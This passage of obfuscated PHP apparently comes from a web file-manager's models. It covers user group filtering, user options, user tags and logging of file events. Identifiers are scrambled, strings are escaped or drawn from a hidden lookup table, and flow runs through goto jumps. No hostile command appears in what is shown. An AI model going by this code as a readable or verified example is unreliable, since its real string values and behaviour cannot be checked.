array_merge($FâÉ¥›£Ø, $d»ÓÚÇÊø, $b–ù¨êîƒØ[$eÎ“»¼—é[354]]); $b–ù¨êîƒØ[$eÎ“»¼—é[354]] = array_unique_by_key($cÄ·İÌ¿‡, $eÎ“»¼—é[1456]); $b–ù¨êîƒØ[$eÎ“»¼—é[351]][$eÎ“»¼—é[352]] = count($b–ù¨êîƒØ[$eÎ“»¼—é[354]]); $b–ù¨êîƒØ[$eÎ“»¼—é[351]][$eÎ“»¼—é[353]] = ceil($b–ù¨êîƒØ[$eÎ“»¼—é[351]][$eÎ“»¼—é[352]] / $b–ù¨êîƒØ[$eÎ“»¼—é[351]][$eÎ“»¼—é[349]]); } $this->_listDataApply($b–ù¨êîƒØ[$eÎ“»¼—é[354]]); $this->_filterByGroup($b–ù¨êîƒØ, $E¦Å£ñƒÑÙ); goto f‘µ‡ŞÛ; c¦ÀÒäã¯¦: } private function _filterByGroup(&$bëŸËõ§îÖ, $bÄÎ­£†Ú§) { $D°ÛØÅ¹Â‘ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$bÄÎ­£†Ú§) { return $bëŸËõ§îÖ; } foreach ($bëŸËõ§îÖ[$D°ÛØÅ¹Â‘[354]] as $EÓå™ÓöÃ© => &$föÏ˜µÓ‚) { $aƒíáğ¬¼ = array_to_keyvalue($föÏ˜µÓ‚[$D°ÛØÅ¹Â‘[2296]], $D°ÛØÅ¹Â‘[33], $D°ÛØÅ¹Â‘[2127]); if (!in_array($bÄÎ­£†Ú§, $aƒíáğ¬¼)) { unset($bëŸËõ§îÖ[$D°ÛØÅ¹Â‘[354]][$EÓå™ÓöÃ©]); } } unset($föÏ˜µÓ‚); $bëŸËõ§îÖ[$D°ÛØÅ¹Â‘[354]] = array_values($bëŸËõ§îÖ[$D°ÛØÅ¹Â‘[354]]); $bëŸËõ§îÖ[$D°ÛØÅ¹Â‘[351]] = array($D°ÛØÅ¹Â‘[2360] => count($bëŸËõ§îÖ[$D°ÛØÅ¹Â‘[354]]), $D°ÛØÅ¹Â‘[2358] => $bëŸËõ§îÖ[$D°ÛØÅ¹Â‘[351]][$D°ÛØÅ¹Â‘[349]], $D°ÛØÅ¹Â‘[2357] => 1, $D°ÛØÅ¹Â‘[2359] => 1); } private function _searchFromMeta($Fª™ºãˆ—, $D‹™Ø‚”Ò‰, $D´¢†Å™) { goto dÌ¦¨Ò¨†É; dÌ¦¨Ò¨†É: $a´ˆ¯ö—¦Ü =& $_SERVER[ã®Â„Éæ¹¤]; $D‹™Ø‚”Ò‰ = strtolower($D‹™Ø‚”Ò‰); $Dê—ˆ—Ù÷ê = array($a´ˆ¯ö—¦Ü[89] => $Fª™ºãˆ—, $a´ˆ¯ö—¦Ü[359] => array($a´ˆ¯ö—¦Ü[774], "\45{$D‹™Ø‚”Ò‰}\x25")); goto CùÍ¤áø·; B†¡Ô™›¶«: $B¢¢¾ˆ†è = $this->where(array($a´ˆ¯ö—¦Ü[1447] => array($a´ˆ¯ö—¦Ü[7], $c±İÉçšœ )))->select(); if (!$B¢¢¾ˆ†è) { return array(); } return $B¢¢¾ˆ†è; goto BÄÙÜªï¡Ÿ; CùÍ¤áø·: $c±İÉçšœ  = Model($a´ˆ¯ö—¦Ü[2582])->where($Dê—ˆ—Ù÷ê)->limit($D´¢†Å™)->select(); if (!$c±İÉçšœ ) { return array(); } $c±İÉçšœ  = array_to_keyvalue($c±İÉçšœ , $a´ˆ¯ö—¦Ü[33], $a´ˆ¯ö—¦Ü[1456]); goto B†¡Ô™›¶«; BÄÙÜªï¡Ÿ: } private function _listDataApplyItem($FœâÂ®¬¨Ï) { $B‰¶×±äáÈ = array($FœâÂ®¬¨Ï); $this->_listDataApply($B‰¶×±äáÈ); return $B‰¶×±äáÈ[0]; } private function _listDataApply(&$BÖ‘—–†ƒ) { goto EŒôÄ‹Õ¿ë; eÆö¿‘°ŠØ: $bœí¡¬š„² = array_to_keyvalue($BÖ‘—–†ƒ, $AêòÓ×â[33], $AêòÓ×â[1456]); $this->_listAppendGroup($BÖ‘—–†ƒ, $bœí¡¬š„²); $this->_listAppendMeta($BÖ‘—–†ƒ, $bœí¡¬š„²); goto bö»áğ±; bö»áğ±: $this->_listAppendSourceRoot($BÖ‘—–†ƒ, $bœí¡¬š„²); goto C§ëÒ¶¶ŒŒ; EŒôÄ‹Õ¿ë: $AêòÓ×â =& $_SERVER[ã®Â„Éæ¹¤]; if (!$BÖ‘—–†ƒ) { return; } array_remove_key($BÖ‘—–†ƒ, $AêòÓ×â[823]); goto eÆö¿‘°ŠØ; C§ëÒ¶¶ŒŒ: } private function _listAppendSourceRoot(&$bÙÌ‘ª£³, $A”È²Üôø­) { goto EŒŸ±…Ğ“; aé‘¨ÌöÕ¦: $c÷Õ¤­Í‡Ä = Model($BÕõÁ‹èÀ[775])->order($BÕõÁ‹èÀ[2220])->field($FÊ˜­Ú†¸)->where($B‹¿åÒ¡Ë)->select(); $c÷Õ¤­Í‡Ä = array_to_keyvalue($c÷Õ¤­Í‡Ä, $BÕõÁ‹èÀ[458]); $c÷Õ¤­Í‡Ä = array_remove_key($c÷Õ¤­Í‡Ä, $BÕõÁ‹èÀ[458]); goto f½âŞ­”¬Œ; f½âŞ­”¬Œ: foreach ($bÙÌ‘ª£³ as &$d×é£²Ÿ­ˆ) { $d×é£²Ÿ­ˆ[$BÕõÁ‹èÀ[391]] = $c÷Õ¤­Í‡Ä[$d×é£²Ÿ­ˆ[$BÕõÁ‹èÀ[1456]]] ? $c÷Õ¤­Í‡Ä[$d×é£²Ÿ­ˆ[$BÕõÁ‹èÀ[1456]]] : array(); } unset($d×é£²Ÿ­ˆ); goto bÊªÀ×İäó; EŒŸ±…Ğ“: $BÕõÁ‹èÀ =& $_SERVER[ã®Â„Éæ¹¤]; $B‹¿åÒ¡Ë = array($BÕõÁ‹èÀ[463] => 0, $BÕõÁ‹èÀ[371] => SourceModel::TYPE_USER, $BÕõÁ‹èÀ[458] => array($BÕõÁ‹èÀ[7], $A”È²Üôø­)); $FÊ˜­Ú†¸ = $BÕõÁ‹èÀ[2219]; goto aé‘¨ÌöÕ¦; bÊªÀ×İäó: } private function _listAppendGroup(&$aŠØõ£ßÙ•, $Dˆ£ƒİÑ) { goto E¼…©ƒƒ—; aç‹ç¶ƒñÀ: foreach ($aŠØõ£ßÙ• as &$D”ªãËİ”) { $D”ªãËİ”[$A»áö¨[2296]] = array(); if (isset($aƒ¸øËã‡ª[$D”ªãËİ”[$A»áö¨[1456]]])) { $D”ªãËİ”[$A»áö¨[2296]] = $aƒ¸øËã‡ª[$D”ªãËİ”[$A»áö¨[1456]]]; } } unset($D”ªãËİ”); goto EíŞÁÌà˜„; E¼…©ƒƒ—: $A»áö¨ =& $_SERVER[ã®Â„Éæ¹¤]; $a‹§Œ”Ï¸Á = array($A»áö¨[1456] => array($A»áö¨[7], $Dˆ£ƒİÑ)); $aƒ¸øËã‡ª = Model($A»áö¨[2206])->where($a‹§Œ”Ï¸Á)->select(); goto Aª¢ŒãôŒ†; bÁšõ¾Õó: $aƒ¸øËã‡ª = array_to_keyvalue_group($aƒ¸øËã‡ª, $A»áö¨[1456]); foreach ($aƒ¸øËã‡ª as &$CÇ¦ªØÌí) { $FÈí¿ÓµÃÆ = array(); foreach ($CÇ¦ªØÌí as $B®†Æ¼•ğã) { if (!$B®†Æ¼•ğã[$A»áö¨[2271]]) { continue; } $e½ğÄƒç = Model($A»áö¨[2290])->listData($B®†Æ¼•ğã[$A»áö¨[2271]]); $FÈí¿ÓµÃÆ[] = array($A»áö¨[2127] => $B®†Æ¼•ğã[$A»áö¨[2127]], $A»áö¨[2584] => $cÈÚƒÛ·ãß[$B®†Æ¼•ğã[$A»áö¨[2127]]][$A»áö¨[28]], $A»áö¨[461] => $cÈÚƒÛ·ãß[$B®†Æ¼•ğã[$A»áö¨[2127]]][$A»áö¨[461]], $A»áö¨[376] => $e½ğÄƒç); } $CÇ¦ªØÌí = $FÈí¿ÓµÃÆ; } unset($CÇ¦ªØÌí); goto aç‹ç¶ƒñÀ; CµÛâÆÛäê: $a‹§Œ”Ï¸Á = array($A»áö¨[2127] => array($A»áö¨[7], $CÑ¡ÓÄÉ´)); $cÈÚƒÛ·ãß = Model($A»áö¨[2294])->field($A»áö¨[2583])->where($a‹§Œ”Ï¸Á)->select(); $cÈÚƒÛ·ãß = array_to_keyvalue($cÈÚƒÛ·ãß, $A»áö¨[2127]); goto bÁšõ¾Õó; Aª¢ŒãôŒ†: $CÑ¡ÓÄÉ´ = array_to_keyvalue($aƒ¸øËã‡ª, $A»áö¨[33], $A»áö¨[2127]); $CÑ¡ÓÄÉ´ = array_remove_value(array_unique($CÑ¡ÓÄÉ´), $A»áö¨[470]); if (!$CÑ¡ÓÄÉ´ || !$aƒ¸øËã‡ª) { return; } goto CµÛâÆÛäê; EíŞÁÌà˜„: } private function _listAppendMeta(&$f°¸Şå¾Ä…, $c­áæğ·Œ¨) { goto F ÂŒ°ÕÖ‹; cÖª˜¢ÜÎ¿: foreach ($EİÅğÓ‰ÂÂ as &$F§åšáãÁÔ) { $díİÚÁÂÜ¡ = array(); foreach ($F§åšáãÁÔ as $CšøİÌ »ä) { if (!in_array($CšøİÌ »ä[$Bœ¢àØÉÖÖ[89]], $CÑä¨õÊ¡æ)) { $díİÚÁÂÜ¡[$CšøİÌ »ä[$Bœ¢àØÉÖÖ[89]]] = $CšøİÌ »ä[$Bœ¢àØÉÖÖ[359]]; } } $F§åšáãÁÔ = $díİÚÁÂÜ¡; } unset($F§åšáãÁÔ); $côºêÅí“ = Model($Bœ¢àØÉÖÖ[2585]); goto d§Š·ˆ÷ôå; d§Š·ˆ÷ôå: foreach ($f°¸Şå¾Ä… as &$B÷Š„À¬‡) { $eîŠÉ’¡¾œ = array(); if (isset($EİÅğÓ‰ÂÂ[$B÷Š„À¬‡[$Bœ¢àØÉÖÖ[1456]]])) { $eîŠÉ’¡¾œ = $EİÅğÓ‰ÂÂ[$B÷Š„À¬‡[$Bœ¢àØÉÖÖ[1456]]]; } $B÷Š„À¬‡[$Bœ¢àØÉÖÖ[2586]] = array(); if (isset($eîŠÉ’¡¾œ[$eä—§†µãÙ])) { $B÷Š„À¬‡[$Bœ¢àØÉÖÖ[2586]] = $côºêÅí“->getUserJobInfo($eîŠÉ’¡¾œ[$eä—§†µãÙ]); } } unset($B÷Š„À¬‡); goto fƒë‡ÕƒŞæ; F ÂŒ°ÕÖ‹: $Bœ¢àØÉÖÖ =& $_SERVER[ã®Â„Éæ¹¤]; $eä—§†µãÙ = UserJobModel::JOB_KEY; $CÑä¨õÊ¡æ = array($Bœ¢àØÉÖÖ[2564]); goto E¬ªĞù‘Éä; E¬ªĞù‘Éä: $c¹è÷¶Úº = array($Bœ¢àØÉÖÖ[1456] => array($Bœ¢àØÉÖÖ[7], $c­áæğ·Œ¨)); $EİÅğÓ‰ÂÂ = Model($Bœ¢àØÉÖÖ[2561])->where($c¹è÷¶Úº)->select(); $EİÅğÓ‰ÂÂ = array_to_keyvalue_group($EİÅğÓ‰ÂÂ, $Bœ¢àØÉÖÖ[1456]); goto cÖª˜¢ÜÎ¿; fƒë‡ÕƒŞæ: } protected function groupUserAll($aÊÌ®Ãï›É) { $F“³ç¼²² =& $_SERVER[ã®Â„Éæ¹¤]; if (!$aÊÌ®Ãï›É) { return !1; } $e¦¦¸óÙ = Model($F“³ç¼²²[2206])->field($F“³ç¼²²[1456])->where(array($F“³ç¼²²[2127] => array($F“³ç¼²²[7], $aÊÌ®Ãï›É)))->select(); $e¦¦¸óÙ = array_to_keyvalue($e¦¦¸óÙ, $F“³ç¼²²[33], $F“³ç¼²²[1456]); return array_unique($e¦¦¸óÙ); } public function userSearch($D„¨İÇŞ”Á, $eÌ©´¦£¿ = "\52") { return Model($_SERVER[ã®Â„Éæ¹¤][479])->where($D„¨İÇŞ”Á)->field($eÌ©´¦£¿)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\x5f\x6f\x70\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($DÅéÖ·¿™) { $cí¯†±ê‡ =& $_SERVER[ã®Â„Éæ¹¤]; if (!defined($cí¯†±ê‡[427])) { define($cí¯†±ê‡[427], 0); } return "\x55\x73\145\x72\117\x70\x74\151\x6f\156\x5f{$DÅéÖ·¿™}\x5f" . USER_ID; } protected function filterWhere($eÏã††Õ¿å) { $B¿¶Ë•¬ô =& $_SERVER[ã®Â„Éæ¹¤]; if (!defined($B¿¶Ë•¬ô[427])) { define($B¿¶Ë•¬ô[427], 0); } $eÏã††Õ¿å[$B¿¶Ë•¬ô[1456]] = USER_ID; return $eÏã††Õ¿å; } public function cacheRemoveUser($aÖº¹ôŸîÙ, $E×Ê¹´µ˜–) { return Cache::remove("\x55\x73\145\162\x4f\x70\164\x69\157\156\x5f{$aÖº¹ôŸîÙ}\x5f" . $E×Ê¹´µ˜–); } protected function optionDefault($CŒÔ»Ò¹Ë£ = '') { $d¶É‡ÙÖàÇ =& $_SERVER[ã®Â„Éæ¹¤]; if ($CŒÔ»Ò¹Ë£ == $d¶É‡ÙÖàÇ[33]) { return $GLOBALS[$d¶É‡ÙÖàÇ[6]][$d¶É‡ÙÖàÇ[2587]]; } if ($CŒÔ»Ò¹Ë£ == $d¶É‡ÙÖàÇ[2588]) { return $GLOBALS[$d¶É‡ÙÖàÇ[6]][$d¶É‡ÙÖàÇ[2589]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\56\x74\141\147\114\x69\x73\164"; public $modelType = "\x55\163\145\162\117\x70\x74\x69\157\156"; public $field = array("\x6e\141\155\145", "\163\164\x79\154\x65", "\163\x6f\162\x74"); public function listData($aëºóáˆÈŸ = false, $Eª¾Ã®Ú¤ = "\163\x6f\x72\164", $a´Ÿ¯½ÑŠ = false) { return parent::listData($aëºóáˆÈŸ, $Eª¾Ã®Ú¤, $a´Ÿ¯½ÑŠ); } public function remove($f¿è„Îèˆ„) { return parent::remove($f¿è„Îèˆ„); } public function add($CÔ‚ÛÜÜ‹‹, $B¢“˜ ˆÍå = "\154\141\x62\x65\x6c\55\x67\162\x65\x79\x2d\x6e\157\x72\x6d\x61\154") { $a«ëæãİÓ =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->findByName($CÔ‚ÛÜÜ‹‹)) { return !1; } $e«ò³Èğ¸Õ = array($a«ëæãİÓ[386] => $CÔ‚ÛÜÜ‹‹, $a«ëæãİÓ[437] => $B¢“˜ ˆÍå, $a«ëæãİÓ[2131] => $this->getSort($a«ëæãİÓ[246]) + 1); return parent::insert($e«ò³Èğ¸Õ); } public function update($FïÓ¹ëÎ‡®, $DñÅíêÉéµ) { $A¸ô¥¬õµ• =& $_SERVER[ã®Â„Éæ¹¤]; $EóÈÃ›‹İŒ = $this->listData($FïÓ¹ëÎ‡®); $F˜¨ƒ‡—¸ = $this->findByName($DñÅíêÉéµ[$A¸ô¥¬õµ•[28]]); if (!$EóÈÃ›‹İŒ || $F˜¨ƒ‡—¸ && $F˜¨ƒ‡—¸[$A¸ô¥¬õµ•[367]] != $EóÈÃ›‹İŒ[$A¸ô¥¬õµ•[367]]) { return !1; } return parent::update($FïÓ¹ëÎ‡®, $DñÅíêÉéµ); } public function moveTop($cÓòâÖ¦È) { $Có—ºÍØ„‘ =& $_SERVER[ã®Â„Éæ¹¤]; $aœ¢ï‰£‡ = parent::listData(); $c‚‡ºå ¦ = $this->getSort($Có—ºÍØ„‘[245]); foreach ($aœ¢ï‰£‡ as &$càïì¶²°í) { if ($càïì¶²°í[$Có—ºÍØ„‘[367]] == $cÓòâÖ¦È) { $càïì¶²°í[$Có—ºÍØ„‘[2149]] = $c‚‡ºå ¦; continue; } $càïì¶²°í[$Có—ºÍØ„‘[2149]] += 1; } unset($càïì¶²°í); return parent::resetData($aœ¢ï‰£‡); } public function moveBottom($d…Àë·¶†Ş) { $cÈ¥ã¶Äù§ =& $_SERVER[ã®Â„Éæ¹¤]; $E÷ÉèÂ©‚ = $this->getSort($cÈ¥ã¶Äù§[246]) + 1; return parent::update($d…Àë·¶†Ş, array($cÈ¥ã¶Äù§[2149] => $E÷ÉèÂ©‚)); } public function resetSort($cÄØôØ­Ï„) { goto bò‡¨“³¤ó; D›†åÀâæ·: unset($fİêñ‰Â); return parent::resetData($E–…´Î¤•Æ); goto D©ÄÇá÷ò¥; bßç§ƒ¼Ò: for ($D¡óÒŸêó‘ = 0; $D¡óÒŸêó‘ < count($cÄØôØ­Ï„); $D¡óÒŸêó‘++) { $cëÒ»á¼È×[$cÄØôØ­Ï„[$D¡óÒŸêó‘] . $D‰Çñ®¿âæ[33]] = $D¡óÒŸêó‘ + 1; } $E–…´Î¤•Æ = parent::listData(); foreach ($E–…´Î¤•Æ as &$fİêñ‰Â) { $eœ®‹ŸŠÀŞ = $cëÒ»á¼È×[$fİêñ‰Â[$D‰Çñ®¿âæ[367]]]; $fİêñ‰Â[$D‰Çñ®¿âæ[2149]] = $eœ®‹ŸŠÀŞ ? $eœ®‹ŸŠÀŞ : $fİêñ‰Â[$D‰Çñ®¿âæ[2149]]; } goto D›†åÀâæ·; bò‡¨“³¤ó: $D‰Çñ®¿âæ =& $_SERVER[ã®Â„Éæ¹¤]; $cëÒ»á¼È× = array(); $cÄØôØ­Ï„ = is_array($cÄØôØ­Ï„) ? $cÄØôØ­Ï„ : array(); goto bßç§ƒ¼Ò; D©ÄÇá÷ò¥: } private function getSort($bíÏ¶Â³î§) { $A±Šç˜»İ¢ =& $_SERVER[ã®Â„Éæ¹¤]; $AåŞâêÓº  = parent::listData(); $e¼ëÊŒ¹½à = array_to_keyvalue($AåŞâêÓº , $A±Šç˜»İ¢[33], $A±Šç˜»İ¢[2149]); if (!$e¼ëÊŒ¹½à) { $e¼ëÊŒ¹½à = array(0); } $AäšÉğ‰ö· = $bíÏ¶Â³î§ == $A±Šç˜»İ¢[246] ? max($e¼ëÊŒ¹½à) : min($e¼ëÊŒ¹½à); return intval($AäšÉğ‰ö·); } } goto EùÄÃ÷Ò«; a²›š×ˆˆå: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\x63\x65\137\145\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\x65\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\151\156\x73\x65\162\x74", "\x66\x75\x6e\x63\164\151\x6f\x6e"), array("\144\x65\x73\x63", '', "\151\x6e\163\145\162\164\x2c\165\x70\x64\141\x74\x65\54\x73\x65\x6c\145\143\164", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($F›ö¥§¶¬Ä, $BòîŠÎ½øñ, $b£æ›ÎÜÍ = '') { goto dÆ…ÊÂš˜¸; c¬ÓëÈç: if (!$cŠˆ‚´ïËó) { return !1; } if ($this->isCacheEvent($cŠˆ‚´ïËó, $BòîŠÎ½øñ)) { return; } if ($b£æ›ÎÜÍ && is_string($b£æ›ÎÜÍ)) { $b£æ›ÎÜÍ = array($fÑÙšâ“›š[2158] => $b£æ›ÎÜÍ); } goto bøöæƒ£; bøöæƒ£: $a”ö²Œ‹ã = array($fÑÙšâ“›š[383] => $F›ö¥§¶¬Ä, $fÑÙšâ“›š[2330] => $cŠˆ‚´ïËó[$fÑÙšâ“›š[463]], $fÑÙšâ“›š[2331] => $cŠˆ‚´ïËó[$fÑÙšâ“›š[28]], $fÑÙšâ“›š[468] => $cŠˆ‚´ïËó[$fÑÙšâ“›š[468]], $fÑÙšâ“›š[1447] => USER_ID, $fÑÙšâ“›š[388] => $BòîŠÎ½øñ, $fÑÙšâ“›š[1449] => $b£æ›ÎÜÍ); $this->addSystemLog($BòîŠÎ½øñ, $a”ö²Œ‹ã); return $this->add($a”ö²Œ‹ã); goto EÏ÷ˆí…¢ù; dÆ…ÊÂš˜¸: $fÑÙšâ“›š =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->eventSave) { return; } $cŠˆ‚´ïËó = Model($fÑÙšâ“›š[1136])->sourceInfo($F›ö¥§¶¬Ä); goto c¬ÓëÈç; EÏ÷ˆí…¢ù: } private function addSystemLog($E‹Ä½ÍìÉÅ, $féÌï±õ±À) { $F‘Š¿óÉªŸ =& $_SERVER[ã®Â„Éæ¹¤]; if ($E‹Ä½ÍìÉÅ == $F‘Š¿óÉªŸ[2332]) { $E‹Ä½ÍìÉÅ = $féÌï±õ±À[$F‘Š¿óÉªŸ[405]][$F‘Š¿óÉªŸ[2333]]; } else { if (in_array($E‹Ä½ÍìÉÅ, array($F‘Š¿óÉªŸ[2104], $F‘Š¿óÉªŸ[2334]))) { $E‹Ä½ÍìÉÅ = $féÌï±õ±À[$F‘Š¿óÉªŸ[405]][$F‘Š¿óÉªŸ[714]]; } } $Bé½š¼™Üè = array_merge($féÌï±õ±À, array($F‘Š¿óÉªŸ[2335] => $féÌï±õ±À[$F‘Š¿óÉªŸ[369]], $F‘Š¿óÉªŸ[2336] => $féÌï±õ±À[$F‘Š¿óÉªŸ[2336]])); Model($F‘Š¿óÉªŸ[2067])->addLog($F‘Š¿óÉªŸ[2337] . $E‹Ä½ÍìÉÅ, $Bé½š¼™Üè); } private function isCacheEvent($d®„¤„‡íš, $fÊØµªàæİ) { if ($d®„¤„‡íš[$_SERVER[ã®Â„Éæ¹¤][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($aœ®ò‹×, $Fâ¬‘Û—Õ¾) { $e±²³’Á‰Ë =& $_SERVER[ã®Â„Éæ¹¤]; $BÄ‘³Ä„Ä = Model($e±²³’Á‰Ë[1136])->sourceInfo($aœ®ò‹×); $e •„¾œíá = array($e±²³’Á‰Ë[2333] => $Fâ¬‘Û—Õ¾, $e±²³’Á‰Ë[28] => $BÄ‘³Ä„Ä[$e±²³’Á‰Ë[28]]); return $this->addEvent($aœ®ò‹×, $e±²³’Á‰Ë[2332], $e •„¾œíá); } public function eventFileEdit($CÖá¦§…ëË) { $B¢‹—±‡ =& $_SERVER[ã®Â„Éæ¹¤]; $E§Í³Œ­Ëğ = array($B¢‹—±‡[2338] => $_SERVER[$B¢‹—±‡[2339]], $B¢‹—±‡[1771] => strtolower(ACTION)); return $this->addEvent($CÖá¦§…ëË, $B¢‹—±‡[2094], $E§Í³Œ­Ëğ); } public function eventRecycle($fŞƒ‚ã—Ê, $c†Ôä»Íâ) { return $this->addEvent($fŞƒ‚ã—Ê, $_SERVER[ã®Â„Éæ¹¤][2334], $c†Ôä»Íâ); } public function eventRemove($EƒîÒ¨ØÀ‘) { $e˜ «ŞŠò =& $_SERVER[ã®Â„Éæ¹¤]; $A•÷ËŸÙÁ = Model($e˜ «ŞŠò[1136])->sourceInfo($EƒîÒ¨ØÀ‘); $FİÄ„²Ô = $A•÷ËŸÙÁ[$e˜ «ŞŠò[28]]; return $this->addEvent($A•÷ËŸÙÁ[$e˜ «ŞŠò[463]], $e˜ «ŞŠò[2093], $FİÄ„²Ô); } public function eventShare($cÕæã’éÊË, $bõéÎ¿Ïá) { return $this->addEvent($cÕæã’éÊË, $_SERVER[ã®Â„Éæ¹¤][2104], $bõéÎ¿Ïá); } public function eventMove($BçÜ¶¢ÂÄ¢, $e¨–ÍåõÌØ, $D›Ñ¯ŒÆ½Ù) { goto d˜¤‘ø; d˜¤‘ø: $D´õ×˜Ù¿„ =& $_SERVER[ã®Â„Éæ¹¤]; $dáïÎõƒ = Model($D´õ×˜Ù¿„[1136]); $a±¿ôæ¤ÏÄ = $dáïÎõƒ->sourceInfo($BçÜ¶¢ÂÄ¢); goto eÏê™‘ğ™; d½ïùÕ®šØ: $this->addEvent($BçÜ¶¢ÂÄ¢, $D´õ×˜Ù¿„[494], $eÊ©·ÄïËš); $a±¿ôæ¤ÏÄ = $dáïÎõƒ->sourceInfo($BçÜ¶¢ÂÄ¢); $eÊ©·ÄïËš = array($D´õ×˜Ù¿„[369] => $a±¿ôæ¤ÏÄ[$D´õ×˜Ù¿„[369]], $D´õ×˜Ù¿„[28] => $a±¿ôæ¤ÏÄ[$D´õ×˜Ù¿„[28]]); goto fÚ¨ñ° ƒ; eÏê™‘ğ™: $A§Š‚‘“ = $dáïÎõƒ->sourceInfo($e¨–ÍåõÌØ); $EààŞˆèµ‡ = $dáïÎõƒ->sourceInfo($D›Ñ¯ŒÆ½Ù); $eÊ©·ÄïËš = array($D´õ×˜Ù¿„[1026] => $e¨–ÍåõÌØ, $D´õ×˜Ù¿„[2340] => $A§Š‚‘“[$D´õ×˜Ù¿„[28]], $D´õ×˜Ù¿„[2341] => $A§Š‚‘“[$D´õ×˜Ù¿„[468]], $D´õ×˜Ù¿„[1027] => $D›Ñ¯ŒÆ½Ù, $D´õ×˜Ù¿„[2342] => $EààŞˆèµ‡[$D´õ×˜Ù¿„[28]], $D´õ×˜Ù¿„[2343] => $EààŞˆèµ‡[$D´õ×˜Ù¿„[468]]); goto d½ïùÕ®šØ; fÚ¨ñ° ƒ: $this->addEvent($e¨–ÍåõÌØ, $D´õ×˜Ù¿„[2344], $eÊ©·ÄïËš); goto c§­ÈÃ†˜˜; c§­ÈÃ†˜˜: } public function eventCopy($C‚®™Ş·õ) { $this->eventCreate($C‚®™Ş·õ, $_SERVER[ã®Â„Éæ¹¤][492]); } public function eventRename($B„‘Œ¤­ôº, $d³´ĞóµÃ, $CŠÇÖÌæÕ) { $bŠğ¦ÑÛ†ò =& $_SERVER[ã®Â„Éæ¹¤]; $c²äµ±±Ùô = array($bŠğ¦ÑÛ†ò[1026] => $d³´ĞóµÃ, $bŠğ¦ÑÛ†ò[1027] => $CŠÇÖÌæÕ); return $this->addEvent($B„‘Œ¤­ôº, $bŠğ¦ÑÛ†ò[1149], $c²äµ±±Ùô); } public function eventAddComment($d“…¤ÉÊè, $e—ÁÜÜ³ÑÊ) { return $this->addEvent($d“…¤ÉÊè, $_SERVER[ã®Â„Éæ¹¤][2345], $e—ÁÜÜ³ÑÊ); } public function eventAddDesc($F™ŞÃèÕ…ª, $F ßÊ±’¨ñ) { return $this->addEvent($F™ŞÃèÕ…ª, $_SERVER[ã®Â„Éæ¹¤][2346], $F ßÊ±’¨ñ); } public function listBySource($E™š‚—‚¢¬) { goto fµîßøÒöë; a•—ÔÇ‰é†: return $this->eventListParse($E¦¹··ËÅ, $E™š‚—‚¢¬); goto d²¼¹„©ç‚; fµîßøÒöë: $e·ŸÀ‚Ì‹â =& $_SERVER[ã®Â„Éæ¹¤]; $E×ÁŸ…¾Ø = Model($e·ŸÀ‚Ì‹â[1136])->sourceInfo($E™š‚—‚¢¬); $F ç·£ˆï“ = array($e·ŸÀ‚Ì‹â[383] => $E™š‚—‚¢¬); goto Bƒ’‹¹¨®Ö; Bƒ’‹¹¨®Ö: if ($E×ÁŸ…¾Ø[$e·ŸÀ‚Ì‹â[370]] == $e·ŸÀ‚Ì‹â[83]) { $eßœÔ¹’› = Model($e·ŸÀ‚Ì‹â[1136])->listSearchChildren($E™š‚—‚¢¬, 20000); $eßœÔ¹’›[] = $E™š‚—‚¢¬ . $e·ŸÀ‚Ì‹â[361]; $F ç·£ˆï“ = array($e·ŸÀ‚Ì‹â[369] => array($e·ŸÀ‚Ì‹â[7], $eßœÔ¹’›)); } $E¦¹··ËÅ = $this->where($F ç·£ˆï“)->order($e·ŸÀ‚Ì‹â[2347])->selectPage(); if ($E¦¹··ËÅ[$e·ŸÀ‚Ì‹â[351]][$e·ŸÀ‚Ì‹â[352]] == 0) { $E¦¹··ËÅ[$e·ŸÀ‚Ì‹â[351]][$e·ŸÀ‚Ì‹â[352]] = 1; $E¦¹··ËÅ[$e·ŸÀ‚Ì‹â[354]] = array(array($e·ŸÀ‚Ì‹â[383] => $E™š‚—‚¢¬, $e·ŸÀ‚Ì‹â[2330] => $E×ÁŸ…¾Ø[$e·ŸÀ‚Ì‹â[463]], $e·ŸÀ‚Ì‹â[1447] => $E×ÁŸ…¾Ø[$e·ŸÀ‚Ì‹â[378]], $e·ŸÀ‚Ì‹â[388] => $e·ŸÀ‚Ì‹â[2348], $e·ŸÀ‚Ì‹â[389] => $E×ÁŸ…¾Ø[$e·ŸÀ‚Ì‹â[187]], $e·ŸÀ‚Ì‹â[1449] => $e·ŸÀ‚Ì‹â[33])); } goto a•—ÔÇ‰é†; d²¼¹„©ç‚: } private function eventListParse($EÄöæìÄ¯‚, $dä¥øÚ¯¶») { goto bŠÓ¿ÖØ÷; eé¨†‰“ñŞ: $b‰Şç¹ÛÑ = Model($a¶Š©è»Ê[775])->sourceListInfo($cÕˆ„Èã, !0); foreach ($f¤„İ®®˜† as &$B÷©‘²˜ì) { if ($B÷©‘²˜ì[$a¶Š©è»Ê[29]] == $a¶Š©è»Ê[494] && isset($B÷©‘²˜ì[$a¶Š©è»Ê[405]][$a¶Š©è»Ê[1026]])) { $B÷©‘²˜ì[$a¶Š©è»Ê[405]][$a¶Š©è»Ê[1026]] = $b‰Şç¹ÛÑ[$B÷©‘²˜ì[$a¶Š©è»Ê[405]][$a¶Š©è»Ê[1026]]]; $B÷©‘²˜ì[$a¶Š©è»Ê[405]][$a¶Š©è»Ê[1027]] = $b‰Şç¹ÛÑ[$B÷©‘²˜ì[$a¶Š©è»Ê[405]][$a¶Š©è»Ê[1027]]]; } if ($B÷©‘²˜ì[$a¶Š©è»Ê[29]] == $a¶Š©è»Ê[2344] && isset($B÷©‘²˜ì[$a¶Š©è»Ê[405]][$a¶Š©è»Ê[369]])) { $B÷©‘²˜ì[$a¶Š©è»Ê[405]][$a¶Š©è»Ê[369]] = 